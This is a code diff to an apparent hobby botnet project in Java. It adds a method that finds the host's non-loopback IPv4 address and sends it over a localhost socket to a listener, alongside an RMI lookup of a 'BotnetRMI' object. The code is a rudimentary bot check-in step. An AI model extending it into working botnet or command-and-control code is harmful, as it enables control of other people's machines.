@@ -10,29 +10,54 @@ import java.io.BufferedWriter;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
+import java.net.Inet4Address;
+import java.net.InetAddress;
 import java.net.MalformedURLException;
+import java.net.NetworkInterface;
 import java.net.Socket;
+import java.net.SocketException;
 import java.rmi.Naming;
 import java.rmi.NotBoundException;
 import java.rmi.RemoteException;
 import java.util.ArrayList;
+import java.util.Enumeration;
 import java.util.Scanner;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 import rmi.IBotnet;
 
-/**
- *
- * @author haiclover
- */
 public class RMIServer {
+    
+    public static String getIP() throws SocketException{
+        Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
+        while( ifaces.hasMoreElements() )
+        {
+          NetworkInterface iface = ifaces.nextElement();
+          Enumeration<InetAddress> addresses = iface.getInetAddresses();
+
+          while( addresses.hasMoreElements() )
+          {
+            InetAddress addr = addresses.nextElement();
+            if( addr instanceof Inet4Address && !addr.isLoopbackAddress() )
+            {
+              return addr.toString();
+            }
+          }
+        }
+        return null;
+    }
+    
     public static void main(String[] args) {
         try {
             IBotnet botnet = (IBotnet) Naming.lookup("rmi://127.0.0.1:1234/BotnetRMI");
             Socket socket = new Socket("127.0.0.1", 2345);
             BufferedWriter writer = new BufferedWriter (new OutputStreamWriter(socket.getOutputStream()));
-            writer.write("send something to server\n");
-            writer.flush();
+            String ip = getIP();
+            if (ip != null){
+                writer.write(ip);
+                writer.write("\n");
+                writer.flush();
+            }
             writer.close();
             socket.close();
 //            botnet.testing();
